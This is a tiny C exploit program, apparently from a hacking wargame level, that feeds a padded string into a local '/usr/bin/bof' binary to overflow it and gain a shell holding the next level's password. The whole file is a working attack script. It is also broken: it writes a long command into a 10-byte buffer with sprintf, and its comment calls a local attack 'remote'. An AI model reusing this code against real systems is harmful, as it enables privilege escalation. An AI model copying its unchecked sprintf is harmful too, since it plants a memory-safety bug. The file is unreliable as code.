// Description:
// This is Remote Exploit tool to get level10's password

#include <stdio.h>

#define BOF "/usr/bin/bof"

char cmdBuf[10];

int main()
{
    sprintf(cmdBuf,"(for i in `seq 1 16`; do printf \"A\"; done; printf \"go\"; cat ) | %s", BOF);
    system(cmdBuf);

    return 0;
}
